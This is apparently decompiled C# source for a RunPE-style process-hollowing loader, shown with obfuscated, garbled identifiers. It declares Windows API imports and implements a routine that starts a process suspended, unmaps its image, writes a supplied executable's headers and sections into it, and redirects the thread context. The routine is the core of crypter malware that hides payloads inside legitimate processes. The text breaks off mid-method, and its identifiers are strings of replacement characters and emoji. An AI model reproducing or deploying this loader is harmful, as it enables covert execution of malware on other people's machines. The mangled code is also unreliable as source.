using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

// Token: 0x02000003 RID: 3
public static class WhatTheFuckIsThis
{
	// Token: 0x06000005 RID: 5
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	private static extern bool CreateProcess(string by-unknown\uFFFD\uFFFD\uFFFD\uFE0F\u26A7\uFFFD\uD83E\uDE33\u200D\uFE0F\u200D\uFFFD\uFE0F\uFFFD\uD83D\uDE36\u200D\uFFFD\u200D\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD, string by-unknown\uFFFD\uFFFD\uFFFD\uD83E\uDD70\uFFFD\u26A7\uFE0F\uFFFD\uD83E\uDD15\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD70\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uFE0F, IntPtr by-unknown\uFFFD\uD83D\uDD75\uFFFD\uFE0F\uD83D\uDD74\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\u26A7\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\u200D\uFFFD, IntPtr by-unknown\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uD83C\uDCAB\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uD83D\uDD70\uFFFD\uFE0F\uFFFD, bool by-unknown\uFFFD\uD83D\uDE33\uFFFD\u2642\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDFFC\u200D\uFFFD\u200D\uFFFD\u200D\uFFFD\uFFFD\u200D\uD83E\uDD14\uFFFD\uFE0F\uFFFD\uFFFD, uint by-unknown\uD83D\uDDE8\uFFFD\uFE0F\uFFFD\uFFFD\u200D\uFFFD\uD83D\uDEC1\uFE0F\uFFFD\uFFFD\uFE0F\uD83C\uDC98\uFFFD\uFFFD\uFFFD\uFE0F\uD83E\uDE33\uFFFD\uFFFD\uFE0F, IntPtr by-unknown\uFFFD\uFFFD\u200D\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\uFE0F\uFFFD\u2642\uFFFD\uD83E\uDD2D\uFFFD\uD83E\uDE1C, string by-unknown\u26A7\uFFFD\u200D\uFFFD\u26A7\uFFFD\uD83E\uDD15\uD83E\uDD70\uFFFD\u200D\u200D\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDCA3\uFFFD\uFFFD\uFFFD\u200D, ref WhatTheFuckIsThis.by-unknown\uD83E\uDD35\uFFFD\uD83E\uDE23\u2642\uFE0F\uD83E\uDF2B\u200D\uFE0F\uFE0F\uFFFD\uD83C\uDD74\uFFFD\uFE0F\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD by-unknown\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDCAB\uFFFD\uFFFD\uFE0F\uD83E\uDE35\uD83C\uDCA3\uD83E\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD35\uFFFD\uD83E\uDDE8\uFFFD, ref WhatTheFuckIsThis.by-unknown\uFFFD\uFFFD\uD83C\uDDE8\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uD83E\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83D\uDE1C\uFE0F\uD83E\uDE23 by-unknown\uFFFD\uD83D\uDF2B\u2642\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uD83D\uDD70\uFFFD\uFFFD\uD83E\uDD2D\uD83D\uDD35\uFFFD\uD83D\uDE33\uFFFD\uFFFD\uD83E\uDD29);

	// Token: 0x06000006 RID: 6
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(IntPtr by-unknown\uFFFD\uD83E\uDE35\uFFFD\u200D\uFFFD\uD83D\uDFF3\uD83D\uDE33\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uD83C\uDFF3\uFE0F\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD, int[] by-unknown\uD83D\uDD74\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83C\uDFFC\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uFE0F\uFFFD\uFFFD\uD83E\uDF2B\uFFFD\uFFFD\uFE0F\uFFFD\u200D);

	// Token: 0x06000007 RID: 7
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64GetThreadContext(IntPtr by-unknown\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDE36\uFFFD\uFFFD\uFE0F\uFFFD\u200D\uD83E\uDD35\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\u200D\uFFFD\uD83E\uDC98\uD83E\uDEA0, int[] by-unknown\u200D\uFFFD\uD83E\uDF2B\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u26A7\uFFFD\uFFFD\uFE0F\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uFFFD);

	// Token: 0x06000008 RID: 8
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(IntPtr by-unknown\uD83D\uDD29\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDE36\uFFFD\uD83C\uDE1C\uFFFD\uFE0F\uFFFD\uFE0F\u200D\uFFFD, int[] by-unknown\uFE0F\uFFFD\uD83E\uDEA0\uD83D\uDCA3\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD74\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uD83E\uDE36\uD83E\uDDE8\uD83E\uDFFC);

	// Token: 0x06000009 RID: 9
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64SetThreadContext(IntPtr by-unknown\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD35\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u26A7\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD, int[] by-unknown\uFFFD\uD83E\uDEC1\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uD83D\uDD2D\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDD2D\uFFFD\uD83D\uDE35\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD);

	// Token: 0x0600000A RID: 10
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool ReadProcessMemory(IntPtr by-unknown\uFFFD\uFE0F\uFFFD\uD83D\uDDE8\uFFFD\u200D\u2642\uD83D\uDD15\uFFFD\uD83D\uDEA0\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uD83D\uDD74\uFE0F, int by-unknown\uFFFD\u26A7\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\u200D\uFFFD\uFFFD\uD83C\uDD35\uFFFD\uFFFD\uFFFD\uD83E\uDFFC\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD, ref int by-unknown\uFE0F\uFFFD\uD83D\uDD75\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83D\uDC98\uD83D\uDE23\uFFFD\u200D\uFFFD\u200D\uFFFD\uFFFD, int by-unknown\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uD83E\uDE36\uFFFD\uD83D\uDEC1\uFFFD\uFFFD\uD83E\uDD2D\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\u200D\uFFFD\uFFFD, ref int by-unknown\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\u200D\uFE0F\uD83E\uDE36\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE23\uFFFD\uFFFD\uFFFD\uD83D\uDDE8\uFE0F\uD83D\uDD29\uFFFD\uFFFD);

	// Token: 0x0600000B RID: 11
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr by-unknown\u26A7\uFFFD\uFFFD\uD83D\uDD15\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFE0F\uFFFD\u200D\uFFFD\u200D\uFFFD\uFFFD\uFE0F, int by-unknown\uD83E\uDD14\uFFFD\uFFFD\uFFFD\uD83D\uDD74\uFFFD\uFFFD\uFE0F\uD83E\uDD14\uD83D\uDFF3\u200D\uFFFD\u200D\uD83E\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD2D\uFFFD, byte[] by-unknown\uFFFD\uFE0F\uFFFD\uFFFD\uD83D\uDCAB\uFFFD\uD83E\uDE23\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uFFFD, int by-unknown\uFFFD\u200D\u200D\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\u200D\uD83D\uDCA3\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDE23\u2642\uFFFD\u200D\uFFFD\uFFFD\u200D, ref int by-unknown\uFFFD\u200D\uFFFD\uFFFD\uD83E\uDEA0\uD83C\uDEA0\u26A7\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\u200D\uD83D\uDD75);

	// Token: 0x0600000C RID: 12
	[SuppressUnmanagedCodeSecurity]
	[DllImport("ntdll.dll")]
	private static extern int NtUnmapViewOfSection(IntPtr by-unknown\uFFFD\uFFFD\uD83D\uDFF3\u200D\uFFFD\uFFFD\u26A7\uFFFD\uD83E\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD29\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uD83C\uDEA0, int by-unknown\uFFFD\uFFFD\uFE0F\uD83D\uDEA0\uD83E\uDEA0\uFFFD\uFFFD\uD83E\uDFFC\uD83E\uDD75\uFE0F\uFFFD\uD83C\uDEA0\uFFFD\uD83E\uDE35\uFFFD\uFFFD\u200D\uD83D\uDD15);

	// Token: 0x0600000D RID: 13
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int VirtualAllocEx(IntPtr by-unknown\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uD83D\uDE23\uFFFD\uD83E\uDEA0\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDEC1\uFFFD\uD83D\uDD75\uFFFD, int by-unknown\u2642\uFFFD\u200D\u200D\uFFFD\uD83E\uDFF3\uFE0F\uFFFD\uD83E\uDD2D\uFFFD\uFFFD\u26A7\uFFFD\uFFFD\u200D\uFFFD\u200D\u200D\uD83D\uDFF3\uFFFD\uD83E\uDC98, int by-unknown\uFFFD\u200D\uFFFD\uFE0F\uD83D\uDEA0\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uFFFD\uD83C\uDD35\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\u200D\uFFFD\u200D, int by-unknown\uFFFD\u26A7\uD83D\uDE3F\uFFFD\uD83E\uDD29\uFFFD\u200D\uD83E\uDCA3\uFE0F\u2642\uD83D\uDEC1\uFE0F\uD83E\uDF2B\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F, int by-unknown\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uD83D\uDEC1\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFE0F\uFFFD\uD83E\uDD74\uFFFD\uFFFD\u200D\uD83E\uDCA3\uD83C\uDE33\uFFFD\uFE0F);

	// Token: 0x0600000E RID: 14
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr by-unknown\uFFFD\uD83E\uDDE8\uFFFD\uFFFD\uFE0F\uFFFD\uD83E\uDE23\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uD83E\uDD70\uFFFD\uFFFD\uD83D\uDFF3\uD83D\uDD14\uFFFD);

	// Token: 0x0600000F RID: 15 RVA: 0x00002730 File Offset: 0x00000930
	public static bool WhatTheFuckIsThisMethod(string by-unknown\uFFFD\uFFFD\u200D\u200D\uFFFD\u200D\uFFFD\uD83C\uDEA0\uFFFD\uFFFD\uD83E\uDDE8\uD83E\uDE23\u2642\uFFFD\uFFFD\uD83D\uDFF3\uD83E\uDF2B\uD83E\uDFFC\uFFFD, byte[] by-unknown\uFFFD\uFFFD\uD83E\uDEC1\uD83E\uDDE8\uD83D\uDD74\uD83E\uDEA0\uD83C\uDD2D\uFFFD\uFE0F\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uD83E\uDCA3\u200D\uD83E\uDC98\uFFFD, bool by-unknown\u2642\uFFFD\uFFFD\uFFFD\u2642\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\u2642\uD83D\uDD70\uFE0F\uD83C\uDD29\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uFFFD\uFFFD)
	{
		for (int i = 1; i <= 5; i++)
		{
			if (WhatTheFuckIsThis.by-unknown\uFE0F\uFE0F\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uFFFD\uD83C\uDEA0\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uD83D\uDEA0(by-unknown\uFFFD\uFFFD\u200D\u200D\uFFFD\u200D\uFFFD\uD83C\uDEA0\uFFFD\uFFFD\uD83E\uDDE8\uD83E\uDE23\u2642\uFFFD\uFFFD\uD83D\uDFF3\uD83E\uDF2B\uD83E\uDFFC\uFFFD, by-unknown\uFFFD\uFFFD\uD83E\uDEC1\uD83E\uDDE8\uD83D\uDD74\uD83E\uDEA0\uD83C\uDD2D\uFFFD\uFE0F\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uD83E\uDCA3\u200D\uD83E\uDC98\uFFFD, by-unknown\u2642\uFFFD\uFFFD\uFFFD\u2642\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\u2642\uD83D\uDD70\uFE0F\uD83C\uDD29\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uFFFD\uFFFD))
			{
				return true;
			}
		}
		return false;
	}

	// Token: 0x06000010 RID: 16 RVA: 0x0000276C File Offset: 0x0000096C
	private static bool by-unknown\uFE0F\uFE0F\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uFFFD\uD83C\uDEA0\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uD83D\uDEA0(string by-unknown\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD35\u200D\u200D\uD83D\uDD75\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD35\uFFFD\uFE0F\u2642\uFFFD\uFFFD\uD83E\uDD14, byte[] by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, bool by-unknown\uD83E\uDE1C\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDCA3\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83E\uDCA3\u200D\uFFFD\uFFFD\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD)
	{
		int num = 0;
		string @string = Encoding.UTF8.GetString(Convert.FromBase64String("I3N5c3RlbTMy"));
		WhatTheFuckIsThis.by-unknown\uD83E\uDD35\uFFFD\uD83E\uDE23\u2642\uFE0F\uD83E\uDF2B\u200D\uFE0F\uFE0F\uFFFD\uD83C\uDD74\uFFFD\uFE0F\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD by-unknown_uD83E_uDD35_uFFFD_uD83E_uDE23_u2642_uFE0F_uD83E_uDF2B_u200D_uFE0F_uFE0F_uFFFD_uD83C_uDD74_uFFFD_uFE0F_uD83D_uDFF3_uFFFD_uFFFD_uFFFD_u200D_uFFFD_uFFFD = default(WhatTheFuckIsThis.by-unknown\uD83E\uDD35\uFFFD\uD83E\uDE23\u2642\uFE0F\uD83E\uDF2B\u200D\uFE0F\uFE0F\uFFFD\uD83C\uDD74\uFFFD\uFE0F\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD);
		WhatTheFuckIsThis.by-unknown\uFFFD\uFFFD\uD83C\uDDE8\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uD83E\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83D\uDE1C\uFE0F\uD83E\uDE23 by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE = default(WhatTheFuckIsThis.by-unknown\uFFFD\uFFFD\uD83C\uDDE8\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uD83E\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83D\uDE1C\uFE0F\uD83E\uDE23);
		by-unknown_uD83E_uDD35_uFFFD_uD83E_uDE23_u2642_uFE0F_uD83E_uDF2B_u200D_uFE0F_uFE0F_uFFFD_uD83C_uDD74_uFFFD_uFE0F_uD83D_uDFF3_uFFFD_uFFFD_uFFFD_u200D_uFFFD_uFFFD.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(WhatTheFuckIsThis.by-unknown\uD83E\uDD35\uFFFD\uD83E\uDE23\u2642\uFE0F\uD83E\uDF2B\u200D\uFE0F\uFE0F\uFFFD\uD83C\uDD74\uFFFD\uFE0F\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD)));
		try
		{
			if (!WhatTheFuckIsThis.CreateProcess(by-unknown\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD35\u200D\u200D\uD83D\uDD75\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD35\uFFFD\uFE0F\u2642\uFFFD\uFFFD\uD83E\uDD14, @string, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref by-unknown_uD83E_uDD35_uFFFD_uD83E_uDE23_u2642_uFE0F_uD83E_uDF2B_u200D_uFE0F_uFE0F_uFFFD_uD83C_uDD74_uFFFD_uFE0F_uD83D_uDFF3_uFFFD_uFFFD_uFFFD_u200D_uFFFD_uFFFD, ref by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE))
			{
				throw new Exception();
			}
			int num2 = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, 60);
			int num3 = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num2 + 26 + 26);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!WhatTheFuckIsThis.GetThreadContext(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!WhatTheFuckIsThis.Wow64GetThreadContext(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num4 = array[41];
			int num5 = 0;
			if (!WhatTheFuckIsThis.ReadProcessMemory(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num4 + 4 + 4, ref num5, 4, ref num))
			{
				throw new Exception();
			}
			if (num3 == num5 && WhatTheFuckIsThis.NtUnmapViewOfSection(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num5) != 0)
			{
				throw new Exception();
			}
			int by-unknown_uFFFD_u200D_uFFFD_uFE0F_uD83D_uDEA0_uFFFD_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uFFFD_uD83C_uDD35_uFFFD_uFE0F_uFFFD_uFFFD_uFFFD_uFE0F_uFFFD_u200D_uFFFD_u200D = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num2 + 80);
			int by-unknown_uFFFD_u200D_u200D_uFE0F_uFFFD_uFFFD_uFFFD_uFFFD_uFE0F_uFFFD_u200D_uD83D_uDCA3_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDE23_u2642_uFFFD_u200D_uFFFD_uFFFD_u200D = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num2 + 42 + 42);
			bool flag = false;
			int num6 = WhatTheFuckIsThis.VirtualAllocEx(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num3, by-unknown_uFFFD_u200D_uFFFD_uFE0F_uD83D_uDEA0_uFFFD_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uFFFD_uD83C_uDD35_uFFFD_uFE0F_uFFFD_uFFFD_uFFFD_uFE0F_uFFFD_u200D_uFFFD_u200D, 12288, 64);
			if (num6 == 0)
			{
				throw new Exception();
			}
			if (!WhatTheFuckIsThis.WriteProcessMemory(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num6, by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, by-unknown_uFFFD_u200D_u200D_uFE0F_uFFFD_uFFFD_uFFFD_uFFFD_uFE0F_uFFFD_u200D_uD83D_uDCA3_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDE23_u2642_uFFFD_u200D_uFFFD_uFFFD_u200D, ref num))
			{
				throw new Exception();
			}
			int num7 = num2 + 248;
			short num8 = BitConverter.ToInt16(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num2 + 3 + 3);
			for (int i = 0; i < (int)num8; i++)
			{
				int num9 = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num7 + 6 + 6);
				int num10 = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num7 + 8 + 8);
				int srcOffset = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num7 + 20);
				if (num10 != 0)
				{
					byte[] array2 = new byte[num10];
					Buffer.BlockCopy(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, srcOffset, array2, 0, array2.Length);
					if (!WhatTheFuckIsThis.WriteProcessMemory(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num6 + num9, array2, array2.Length, ref num))
					{
						throw new Exception();
					}
				}
				num7 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num6);
			if (!WhatTheFuckIsThis.WriteProcessMemory(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle, num4 + 8, bytes, 4, ref num))
			{
				throw new Exception();
			}
			int num11 = BitConverter.ToInt32(by-unknown\uFFFD\uFFFD\uFFFD\uD83D\uDEA0\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDE3F\uD83C\uDC98\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFE0F\uFFFD\u200D\uFFFD\uFFFD, num2 + 40);
			if (flag)
			{
				num6 = num3;
			}
			array[44] = num6 + num11;
			if (IntPtr.Size == 4)
			{
				if (!WhatTheFuckIsThis.SetThreadContext(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!WhatTheFuckIsThis.Wow64SetThreadContext(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ThreadHandle, array))
			{
				throw new Exception();
			}
